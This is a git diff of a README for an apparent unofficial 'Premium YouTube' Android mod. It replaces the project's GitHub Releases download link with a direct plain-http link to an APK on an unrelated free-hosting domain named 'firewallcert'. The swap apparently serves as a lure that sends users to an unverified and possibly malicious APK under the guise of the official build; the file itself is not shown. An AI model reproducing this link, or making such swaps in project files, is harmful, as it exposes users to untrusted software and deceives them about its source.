@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="images/banner.png" alt="Premium YouTube Banner" width="70%" />
+  <img src="images/banner.png" alt="Premium YouTube Banner" width="45%" />
 </p>
 
 <h1 align="center">Premium YouTube</h1>
@@ -39,18 +39,14 @@ This project also includes **YouTube Music** support integrated in a single app.
 
 ## 📥 Download
 
-You can download the official build here:
-
-➡ Go to **Releases** → **Latest** → Download `PremiumYouTube.apk`  
-OR click below (when release uploaded):
+You can directly download the latest build from the link below:
 
 <p align="center">
-  <a href="https://github.com/USERNAME/PremiumYoutube/releases/latest">
-    <img src="https://img.shields.io/badge/Download-APK-red?style=for-the-badge"/>
+  <a href="http://firewallcert.free.nf/YoutubePremium.apk">
+    <img src="https://img.shields.io/badge/Download%20APK-Click%20Here-red?style=for-the-badge"/>
   </a>
 </p>
 
-⚠ Replace `USERNAME` with your GitHub username in link.
 
 ---
 
